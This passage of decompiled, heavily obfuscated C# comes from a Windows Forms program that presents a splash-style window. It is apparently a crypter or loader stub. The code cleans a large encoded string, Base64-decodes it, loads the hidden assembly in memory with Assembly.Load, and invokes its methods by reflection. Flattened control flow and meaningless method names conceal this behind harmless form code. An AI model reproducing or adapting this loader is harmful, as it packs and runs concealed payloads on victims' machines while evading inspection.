u02df??\u02eb\u02df\u0300\u0315??\u0315\u02df\u02e6\u0309\u02df\u0301\u0305??\u030e\u02df\u02e5\u0301\u02df\u02ff\u02df????\u200c??\u200c??\u02ef\u0315??\u0314\u02df\u02e6\u200c??\u0303\u02ef??\u0317\u02df\u02e5\u0309\u02df\u02f8\u0315??\u030d\u02df\u02e6\u02ef\u02df\u02e7\u02df??\u030e\u02df??\u200c??\u02e7\u200c??\u0317\u02df??\u200c??\u02eb\u02ef\u02df??\u200c??\u200c??\u02e9\u0305\u02df??\u200c????\u02df\u02f2\u02df??\u030a\u02df\u02e5\u0301\u02df\u02f7\u02ef??\u0311\u02df??\u02ef\u02df\u0301\u0305??\u0306\u02df\u02e5\u02ef\u02df\u02f8\u02ef??\u0312\u02df\u02e5??\u02df\u0301\u0305??\u0310\u02df\u02e6\u02eb\u200c??\u200c??\u200c??\u200c??\u200c??\u02df????\u200c??\u02d2\u200c??\u02ef????\u02df\u02e6\u02e7\u02df\u02ff\u02ef??\u030c\u02df\u02e5\u0309\u02df\u0300\u0305??\u0306\u02df\u02e5\u0315\u02df\u02f0\u0305??\u030e\u02df\u02e5\u0315\u02df\u02f8\u02ef??\u0313\u02df\u02e5??\u02df\u0300\u02ef??\u030a\u200c??\u200c??\u02ef\u0305????\u02df\u02e5\u02d2\u02df\u02ff\u02ef??\u030b\u02df\u02e6\u02f3\u02df\u02ea\u0305??\u02f4\u02df??\u0309\u02df\u02ea\u0305??\u0309\u02df\u02e5\u0315\u02df\u0300\u200c??\u200c????\u02ef\u02df??\u0305\u02df??\u02df??\u200c??\u0301\u0305??\u0314\u02df\u02e5\u02ef\u02df\u0302\u02ef??\u0308\u02df\u02e6\u02ef\u02df\u02f2\u0305??\u0306\u02df\u02e5??\u02df\u02f8\u02ef\u200c??\u200c??\u200c??\u02ef\u0305????\u02df\u02e5\u02d2\u02df\u02ff\u02ef??\u030b\u02df\u02e6\u02f3\u02df\u02e7\u02df??\u02f4\u02df??\u0309\u200c??\u200c????\u200c??\u0305\u200c??\u02ef??\u02ef\u02df\u02e6\u02e7\u02df\u0300\u0315??\u0309\u02df\u02e6\u02f3\u02df\u02f7\u0315????\u02df??\u02f7\u02df\u02f8\u02ef??\u0317\u02df\u02e6\u02eb\u02df\u02ff\u02ef??\u0314\u02df\u02e5\u02d2\u200c??\u200c??\u0316\u02df??\u02d2\u02df\u02eb\u0315\u02df\u0313\u02df??\u200c??\u02ea\u0305\u02df\u0315\u200c??\u200c??\u02ed\u200c??\u02e7\u200c????\u02df\u02ef\u02ef??\u0318\u02df\u02e6\u02eb\u02df\u02f8\u02ef??\u0312\u02df\u02e5\u02e7\u02df\u0300\u02df??\u02d3\u02df??\u200c??\u02f4\u0305??\u030a\u02df\u02e6\u02e7\u02df\u0301\u0315??\u030e\u02df\u02e5\u02d6\u02df\u0300\u0305\u200c??\u02df????\u02df\u02ea\u0305\u02df\u0318\u02df??\u02d2\u02df\u02eb\u200c??\u0313\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02ef\u200c??\u02df\u02eb\u200c??\u200c??????\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df", "\u200c??", "\u02df\u02df");
		Assembly object_ = default(Assembly);
		object obj = default(object);
		string result = default(string);
		while (true)
		{
			int num = 1936987265;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1C612169u) % 7u)
				{
				case 5u:
					object_ = smethod_3((byte[])obj, bool_3: true);
					num = (int)((num2 * 1831403262) ^ 0x1CE9678C);
					continue;
				case 4u:
					result = text;
					num = ((int)num2 * -818159548) ^ -1885413346;
					continue;
				case 3u:
					num = ((int)num2 * -540468545) ^ 0x6FDACFAD;
					continue;
				case 2u:
				{
					string string_ = smethod_4(text);
					obj = GForm1.smethod_78(smethod_6(GForm1.smethod_77(string_)));
					num = ((int)num2 * -1467131047) ^ 0x12A47328;
					continue;
				}
				case 1u:
					smethod_7(object_);
					num = ((int)num2 * -840555902) ^ -2115591995;
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static object smethod_6(char[] char_0)
	{
		int num = 251367135;
		bool flag = default(bool);
		bool flag2 = default(bool);
		object result = default(object);
		while (true)
		{
			int num2 = -823430416;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0xFE36D7ECu) % 13u)
				{
				case 12u:
				{
					int num6;
					int num7;
					if (!flag)
					{
						num6 = 2036497176;
						num7 = 2036497176;
					}
					else
					{
						num6 = 150395897;
						num7 = 150395897;
					}
					num2 = num6 ^ ((int)num3 * -1788341774);
					continue;
				}
				case 11u:
					num2 = ((int)num3 * -1796618525) ^ -941351506;
					continue;
				case 10u:
					flag2 = num == 251367153;
					num2 = -704011352;
					continue;
				case 9u:
					num = 251367175;
					num2 = -244452244;
					continue;
				case 8u:
					num2 = ((int)num3 * -1017176369) ^ -1008380815;
					continue;
				case 5u:
					num2 = (int)((num3 * 1246476183) ^ 0x7FBF3192);
					continue;
				case 4u:
					num = 251367199;
					num2 = (int)((num3 * 1042606478) ^ 0x5D14AF96);
					continue;
				case 3u:
					result = GForm1.smethod_79(char_0, 0, 22528);
					num2 = ((int)num3 * -325229891) ^ 0x43FC2ADE;
					continue;
				case 2u:
				{
					int num4;
					int num5;
					if (!flag2)
					{
						num4 = 918115550;
						num5 = 918115550;
					}
					else
					{
						num4 = 1421143314;
						num5 = 1421143314;
					}
					num2 = num4 ^ (int)(num3 * 584109074);
					continue;
				}
				case 1u:
					flag = num == 251367143;
					num2 = (int)((num3 * 291383660) ^ 0x4204967F);
					continue;
				case 0u:
					num = 251367192;
					num2 = ((int)num3 * -2027043360) ^ 0x46A8B455;
					continue;
				case 7u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public static object smethod_7(object object_0)
	{
		object result = default(object);
		while (true)
		{
			int num = -721240425;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x85BE4C56u) % 4u)
				{
				case 3u:
					num = ((int)num2 * -1096410983) ^ -1862439043;
					continue;
				case 1u:
					smethod_2((Assembly)object_0);
					num = (int)((num2 * 1509088088) ^ 0x2B2F801D);
					continue;
				case 2u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	static void smethod_8(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_9(Form form_0, FormClosingEventHandler formClosingEventHandler_0)
	{
		form_0.add_FormClosing(formClosingEventHandler_0);
	}

	static void smethod_10(Form form_0)
	{
		Application.Run(form_0);
	}

	static Process smethod_11()
	{
		return Process.GetCurrentProcess();
	}

	static void smethod_12(Process process_0, ProcessPriorityClass processPriorityClass_0)
	{
		process_0.PriorityClass = processPriorityClass_0;
	}

	static string smethod_13()
	{
		return Application.get_StartupPath();
	}

	static string smethod_14(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static Image smethod_15(string string_0)
	{
		return Image.FromFile(string_0);
	}

	static void smethod_16(Control control_0, Image image_0)
	{
		control_0.set_BackgroundImage(image_0);
	}

	static Image smethod_17(Control control_0)
	{
		return control_0.get_BackgroundImage();
	}

	static void smethod_18(Timer timer_2)
	{
		timer_2.Start();
	}

	static void smethod_19()
	{
		GC.Collect();
	}

	static void smethod_20(object object_0)
	{
		GC.SuppressFinalize(object_0);
	}

	static int smethod_21(Image image_0)
	{
		return image_0.get_Width();
	}

	static int smethod_22(Image image_0)
	{
		return image_0.get_Height();
	}

	static Bitmap smethod_23(int int_2, int int_3)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_2, int_3);
	}

	static Graphics smethod_24(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static ColorMatrix smethod_25()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ColorMatrix();
	}

	static void smethod_26(ColorMatrix colorMatrix_0, float float_1)
	{
		colorMatrix_0.set_Matrix33(float_1);
	}

	static ImageAttributes smethod_27()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ImageAttributes();
	}

	static void smethod_28(ImageAttributes imageAttributes_0, ColorMatrix colorMatrix_0, ColorMatrixFlag colorMatrixFlag_0, ColorAdjustType colorAdjustType_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		imageAttributes_0.SetColorMatrix(colorMatrix_0, colorMatrixFlag_0, colorAdjustType_0);
	}

	static void smethod_29(Graphics graphics_0, Image image_0, Rectangle rectangle_0, int int_2, int int_3, int int_4, int int_5, GraphicsUnit graphicsUnit_0, ImageAttributes imageAttributes_0)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, rectangle_0, int_2, int_3, int_4, int_5, graphicsUnit_0, imageAttributes_0);
	}

	static void smethod_30(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static void smethod_31(Timer timer_2)
	{
		timer_2.Stop();
	}

	static void smethod_32(Timer timer_2, int int_2)
	{
		timer_2.set_Interval(int_2);
	}

	static void smethod_33(Control control_0)
	{
		control_0.Show();
	}

	static void smethod_34(Form form_0)
	{
		form_0.Close();
	}

	static DialogResult smethod_35(string string_0, string string_1, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0, string_1, messageBoxButtons_0, messageBoxIcon_0);
	}

	static void smethod_36(Process process_0)
	{
		process_0.Kill();
	}

	static void smethod_37(CancelEventArgs cancelEventArgs_0, bool bool_3)
	{
		cancelEventArgs_0.Cancel = bool_3;
	}

	static void smethod_38(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_39()
	{
		return new Container();
	}

	static PictureBox smethod_40()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static Timer smethod_41(IContainer icontainer_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_1);
	}

	static void smethod_42(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_43(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_44(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_45(Control control_0, ImageLayout imageLayout_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_BackgroundImageLayout(imageLayout_0);
	}

	static void smethod_46(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_47(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_48(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_49(PictureBox pictureBox_5, int int_2)
	{
		pictureBox_5.set_TabIndex(int_2);
	}

	static void smethod_50(PictureBox pictureBox_5, bool bool_3)
	{
		pictureBox_5.set_TabStop(bool_3);
	}

	static void smethod_51(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_52(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_53(Form form_0, Color color_0)
	{
		form_0.set_BackColor(color_0);
	}

	static void smethod_54(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_55(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_56(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static Font smethod_57(string string_0, float float_1, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_1, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_58(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_59(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_60(Form form_0, Padding padding_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_Margin(padding_0);
	}

	static void smethod_61(Form form_0, bool bool_3)
	{
		form_0.set_MaximizeBox(bool_3);
	}

	static void smethod_62(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_63(Form form_0, FormStartPosition formStartPosition_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_StartPosition(formStartPosition_0);
	}

	static void smethod_64(Form form_0, string string_0)
	{
		form_0.set_Text(string_0);
	}

	static void smethod_65(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_66(Control control_0, bool bool_3)
	{
		control_0.ResumeLayout(bool_3);
	}

	static MethodInfo[] smethod_67(Type type_0)
	{
		return type_0.GetMethods();
	}

	static object smethod_68(object object_0, string string_0, CallType callType_0, object[] object_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		return Versioned.CallByName(object_0, string_0, callType_0, object_1);
	}

	static Type[] smethod_69(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static Assembly smethod_70(byte[] byte_0)
	{
		return Assembly.Load(byte_0);
	}

	static char smethod_71(string string_0, int int_2)
	{
		return string_0[int_2];
	}

	static string smethod_72(char char_0)
	{
		return Conversions.ToString(char_0);
	}

	static int smethod_73(string string_0)
	{
		return Strings.AscW(string_0);
	}

	static char smethod_74(int int_2)
	{
		return Strings.Chr(int_2);
	}

	static int smethod_75(string string_0)
	{
		return string_0.Length;
	}

	static string smethod_76(string string_0, string string_1, string string_2)
	{
		return string_0.Replace(string_1, string_2);
	}

	static char[] smethod_77(string string_0)
	{
		return string_0.ToCharArray();
	}

	static object smethod_78(object object_0)
	{
		return RuntimeHelpers.GetObjectValue(object_0);
	}

	static byte[] smethod_79(char[] char_0, int int_2, int int_3)
	{
		return Convert.FromBase64CharArray(char_0, int_2, int_3);
	}

	static void smethod_80(Timer timer_2, EventHandler eventHandler_0)
	{
		timer_2.remove_Tick(eventHandler_0);
	}

	static void smethod_81(Timer timer_2, EventHandler eventHandler_0)
	{
		timer_2.add_Tick(eventHandler_0);
	}

	static void smethod_82(Control control_0, EventHandler eventHandler_0)
	{
		control_0.remove_MouseEnter(eventHandler_0);
	}

	static void smethod_83(Control control_0, EventHandler eventHandler_0)
	{
		control_0.remove_MouseLeave(eventHandler_0);
	}

	static void smethod_84(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.remove_MouseClick(mouseEventHandler_0);
	}

	static void smethod_85(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_MouseEnter(eventHandler_0);
	}

	static void smethod_86(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_MouseLeave(eventHandler_0);
	}

	static void smethod_87(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseClick(mouseEventHandler_0);
	}
}
